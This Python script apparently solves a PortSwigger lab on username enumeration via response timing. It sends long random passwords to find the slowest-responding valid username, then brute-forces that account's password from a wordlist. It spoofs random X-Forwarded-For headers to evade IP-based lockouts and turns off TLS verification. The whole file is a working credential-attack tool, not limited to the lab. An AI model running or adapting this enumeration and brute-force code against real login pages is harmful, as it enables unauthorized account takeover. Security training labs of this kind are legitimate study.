#!/usr/bin/env python3

import asyncio
import aiohttp
import argparse
import secrets
import time
import os
import sys

from bs4 import BeautifulSoup


def check_input_file(input_file: str) -> None:
    """Check if the input file exists and is readable."""

    if not os.path.isfile(input_file):
        sys.stdout.write(f"Error: Input file '{input_file}' does not exist.\n")
        sys.exit(1)
    if not os.access(input_file, os.R_OK):
        sys.stdout.write(f"Error: Input file '{input_file}' is not readable.\n")
        sys.exit(1)
    if not input_file.lower().endswith(".txt"):
        sys.stdout.write("Error: Input file must be a .txt file.\n")
        sys.exit(1)


def extract_tag(content: str):
    """Extracts the warning message from the login response."""
    soup = BeautifulSoup(content, "html.parser")
    warning_tag = soup.find("p", class_="is-warning")
    if warning_tag:
        return warning_tag.get_text()
    return None


def generate_long_password(length: int = 10000) -> str:
    """Generates a long random password to trigger timing delays."""
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return "".join(secrets.choice(chars) for _ in range(length))


async def enumerate_username(
    client: aiohttp.ClientSession,
    url: str,
    payload_file: str,
    concurrency: int = 10,
):
    """Enumerates usernames via response timing with a long password."""
    payloads = []
    try:
        with open(payload_file, "r") as f:
            payloads = [line.strip() for line in f]
    except Exception as e:
        print(f"[-] Error reading payload file: {e}")
        return []

    results = []
    semaphore = asyncio.Semaphore(concurrency)

    async def check_username(username):
        async with semaphore:
            data = {
                "username": username,
                "password": generate_long_password(),
            }
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Forwarded-For": str(secrets.randbelow(1_000_000)),
            }
            start = time.monotonic()
            try:
                async with client.post(
                    url, headers=headers, data=data, allow_redirects=False, ssl=False
                ) as res:
                    elapsed = time.monotonic() - start
                    tag_text = extract_tag(await res.text())
                    results.append((username, elapsed, tag_text))
                    print(f"  {username:<20} {elapsed:.4f}s  {tag_text or ''}")
            except aiohttp.ClientConnectorError:
                pass
            except aiohttp.ClientError as e:
                print(f"[-] Error checking {username}: {e}")

    tasks = [check_username(u) for u in payloads]
    await asyncio.gather(*tasks)
    return results


async def bruteforce_password(
    client: aiohttp.ClientSession,
    url: str,
    username: str,
    payload_file: str,
    concurrency: int = 15,
):
    """Brute-forces the password for a given username."""
    payloads = []
    try:
        with open(payload_file, "r") as f:
            payloads = [line.strip() for line in f]
    except Exception as e:
        print(f"[-] Error reading payload file: {e}")
        return

    found = False
    semaphore = asyncio.Semaphore(concurrency)

    async def check_password(password):
        nonlocal found
        if found:
            return
        async with semaphore:
            data = {"username": username, "password": password}
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Forwarded-For": str(secrets.randbelow(1_000_000)),
            }
            try:
                async with client.post(
                    url, headers=headers, data=data, allow_redirects=False, ssl=False
                ) as res:
                    if res.status == 302:
                        print(f"[+] Valid password: {password}")
                        print(f"[+] Credentials found: {username}:{password}")
                        found = True
            except aiohttp.ClientConnectorError:
                pass
            except aiohttp.ClientError as e:
                print(f"[-] Error checking password '{password}': {e}")

    tasks = [check_password(p) for p in payloads]
    await asyncio.gather(*tasks)

    if not found:
        print(f"[-] No valid password found for '{username}'.")


async def main():
    parser = argparse.ArgumentParser(
        description="Solve Lab: Username enumeration via response timing."
    )
    parser.add_argument(
        "-u", "--url", type=str, required=True,
        help="URL of the PortSwigger lab login page.",
    )
    parser.add_argument(
        "-uname", "--usernames", type=str, required=False,
        help="Path to the usernames wordlist.",
        default="wordlist/usernames.txt",
    )
    parser.add_argument(
        "-pass", "--passwords", type=str, required=False,
        help="Path to the passwords wordlist.",
        default="wordlist/passwords.txt",
    )

    args = parser.parse_args()
    url = args.url.strip()
    usernames_file = args.usernames.strip()
    passwords_file = args.passwords.strip()

    check_input_file(usernames_file)
    check_input_file(passwords_file)

    async with aiohttp.ClientSession(trust_env=True) as client:
        # Step 1: Enumerate via timing
        print("[*] Starting username enumeration (via timing)...")
        print(f"  {'Username':<20} {'Time':<10} Response")
        print(f"  {'-'*20} {'-'*10} {'-'*30}")
        results = await enumerate_username(client, url=url, payload_file=usernames_file)

        if not results:
            print("[-] No results. Exiting.")
            return

        # Pick the slowest response — that's the valid username
        results.sort(key=lambda x: x[1], reverse=True)
        valid_username = results[0][0]
        print(f"\n[+] Valid username (slowest): {valid_username} ({results[0][1]:.4f}s)")

        # Step 2: Brute-force password
        print(f"\n[*] Starting password brute-force for '{valid_username}'...")
        await bruteforce_password(
            client, url=url, username=valid_username, payload_file=passwords_file,
        )


if __name__ == "__main__":
    asyncio.run(main())
